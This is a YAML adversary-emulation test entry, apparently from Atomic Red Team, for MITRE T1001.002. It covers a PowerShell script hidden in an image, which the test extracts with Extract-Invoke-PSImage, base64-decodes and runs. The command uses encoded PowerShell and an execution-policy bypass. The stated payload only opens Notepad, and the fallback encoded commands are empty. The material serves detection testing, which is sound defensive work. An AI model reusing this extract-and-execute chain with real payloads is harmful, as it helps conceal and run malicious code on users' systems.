- requirements: []
  name: Soumaia ART Tests - Embedded Script in Image Execution via Extract-Invoke-PSImage
  description: "This atomic test demonstrates the technique of data obfuscation via steganography, where a PowerShell script is concealed within an image file. \nThe PowerShell script is embedded using steganography techniques, making it undetectable by traditional security measures. The script is hidden \nwithin the pixels of the image, enabling attackers to covertly transfer and execute malicious code across systems.\n\nThe test begins by ensuring the availability of the malicious image file and the Extract-Invoke-PSImage script. The test proceeds to extract the hidden \nPowerShell script (decoded.ps1) from the image file using the Extract-Invoke-PSImage tool. The extracted script is then decoded from base64 encoding and saved as a \nseparate PowerShell (textExtraction.ps1). Consequently, the textExtraction.ps1 script is executed.\n\nIn the case of this atomic test, the malicious image file which is downloaded has the powershell command Start-Process notepad embedded within in base64. This\nis done to emulate an attackers behaviour in the case they were to execute malware embedded within the image file. (requires elevation)"
  tactic: command-and-control
  technique_id: T1001.002
  technique_name: Data Obfuscation via Steganography
  executors:
  - cleanup:
    - Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Ignore; Remove-Item -Path "$HOME\result.ps1" -Force -ErrorAction Ignore; Remove-Item -Path "$HOME\textExtraction.ps1" -Force -ErrorAction Ignore; Remove-Item -Path "$HOME\decoded.ps1" -Force -ErrorAction Ignore
    timeout: 60
    platform: windows
    name: psh
    payloads:
    - evil_kitten.jpg
    parsers: []
    command: powershell -NoProfile -EncodedCommand aQBmACAAKAAhACgAVABlAHMAdAAtAFAAYQB0AGgAIAAiAC4AXABlAHYAaQBsAF8AawBpAHQAdABlAG4ALgBqAHAAZwAiACkAKQAgAHsAZQB4AGkAdAAgADEAfQAgAGUAbABzAGUAIAB7AAoAewBlAHgAaQB0ACAAMAB9AAoAfQAKAA==; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand  }; powershell -NoProfile -EncodedCommand aQBmACAAKAAhACgAVABlAHMAdAAtAFAAYQB0AGgAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwARQB4AHQAcgBhAGMAdAAtAEkAbgB2AG8AawBlAC0AUABTAEkAbQBhAGcAZQAuAHAAcwAxACIAKQApACAAewBlAHgAaQB0ACAAMQB9ACAAZQBsAHMAZQAgAHsACgB7AGUAeABpAHQAIAAwAH0ACgB9AAoA; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand  }; cd "$env:TEMP\ART-ExternalPayloads"; Import-Module .\Extract-Invoke-PSImage.ps1; $extractedScript=Extract-Invoke-PSImage -Image ".\evil_kitten.jpg" -Out "$HOME\result.ps1"; $scriptContent = Get-Content "$HOME\result.ps1" -Raw; $base64Pattern = "(?<=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])"; $base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object { $_.Value }; $base64Strings | Set-Content "$HOME\decoded.ps1"; $decodedContent = Get-Content "$HOME\decoded.ps1" -Raw; $decodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decodedContent)); $textPattern = '^.+'; $textMatches = [regex]::Matches($decodedText, $textPattern) | ForEach-Object { $_.Value }; $scriptPath = "$HOME\textExtraction.ps1"; $textMatches -join '' | Set-Content -Path $scriptPath; . "$HOME\textExtraction.ps1"
  id: b60c4379-84c7-552a-9f4f-56cfa5d27f2a
